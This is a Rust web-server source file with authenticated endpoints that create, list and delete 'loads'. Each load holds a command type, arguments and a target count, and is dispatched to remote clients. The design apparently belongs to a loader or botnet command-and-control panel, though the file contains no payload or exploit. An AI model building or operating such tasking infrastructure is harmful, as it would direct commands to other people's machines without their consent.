use crate::web_paths::*;

#[post("/api/issue_load")]
pub async fn api_issue_load(req_body: String) -> impl Responder {
    let json = match serde_json::from_str(&req_body) {
        Ok(r) => r,
        Err(_) => return resp_badrequest()
    };

    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
            

        let mut writer: Vec<u8> = Vec::new();
        let mut serializer = Serializer::with_formatter(&mut writer, PrettyFormatter::with_indent(b" "));
            
        key_to_array(&json, "cmd_args").serialize(&mut serializer).unwrap();
        
        let mut connection: Conn = obtain_connection().await;
        let parsed_cmd_args = &parse_storage_write(&writer);
        let load_id: String = generate(8, CHARSET);

        match connection.exec_drop(  
            r"INSERT INTO loads (
                load_id, required_amount, cmd_args, 
                is_recursive, cmd_type, note,
                time_issued, completed_amount
            ) VALUES (
                :load_id, :required_amount, :cmd_args, 
                :is_recursive, :cmd_type, :note,
                :time_issued, 0
            )",
            params! {
                "load_id" => &load_id,
                "cmd_args" => parsed_cmd_args,
                "cmd_type" => key_to_string(&json, "cmd_type"),
                "required_amount" => key_to_u64(&json, "amount"),
                "is_recursive" => key_to_bool(&json, "is_recursive"),
                "note" => key_to_string(&json, "note"),
                "time_issued" => get_timestamp(),
            }
        ).await {
            Ok(_) => (),
            Err(e) => fprint("error", &format!("Unable to insert data into load: {}",e)), 
        }

        let is_recursive_text;
        if key_to_bool(&json, "is_recursive") {
            is_recursive_text = "Recursive";
        } else {
            is_recursive_text = "Non-recursive";
        }

        task_clients(&parsed_cmd_args, &key_to_string(&json, "cmd_type"), &load_id, key_to_u64(&json, "amount")).await;
        fprint("success", &format!("{} load created for command {} with these args: {}", 
            is_recursive_text.yellow(), key_to_string(&json, "cmd_type"), parsed_cmd_args.yellow()
        ));

        return resp_ok(load_id);
    } else {
        fprint("failure", &format!("Request was sent to /api/issue without authentication."));
        return resp_unauthorised();

    }
}

#[post("/api/loads_list")]
pub async fn loads_list(req_body: String) -> impl Responder {
    let json = match serde_json::from_str(&req_body) {
        Ok(r) => r,
        Err(_) => return resp_badrequest()
    };

    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;
    
        let mut load_selection = match connection.query_iter(r"SELECT * FROM loads").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(load_selection_sql) Unable to fetch loads");
                return resp_servererror();
            }, 
        };

        let mut json_loads_list = json!({});

        for row in load_selection.collect::<Row>().await.unwrap() {
            json_loads_list[value_to_str(&row, 0)] = json!({
                "required_amount": value_to_u64(&row, 1),
                "completed_amount": value_to_u64(&row, 2),
                "is_recursive": value_to_bool(&row, 3),
                "cmd_args": value_to_str(&row, 4),
                "cmd_type": value_to_str(&row, 5),
                "note": value_to_str(&row, 6),
                "time_issued": value_to_u64(&row, 7),
            });            
        }
        
        return resp_ok(json_loads_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/loads_list without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/remove_load")]
pub async fn remove_load(req_body: String) -> impl Responder {
    let json = match serde_json::from_str(&req_body) {
        Ok(r) => r,
        Err(_) => return resp_badrequest()
    };

    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;

        if is_load(&mut connection, &key_to_string(&json, "load_id")).await {
        
            match connection.exec_drop(
                r"DELETE FROM loads WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(load_removal_sql) Unable to remove load: {}", e));
                    return resp_servererror();
                }, 
            };
        
            match connection.exec_drop(
                r"DELETE FROM commands WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(command_removal_sql) Unable to remove commands: {}", e));
                    return resp_servererror();
                }, 
            };
            
            return resp_ok(String::from("Successfully removed load."));
        } else {
            return resp_badrequest();
        }
    } else {
        fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
        return resp_unauthorised();
    }
}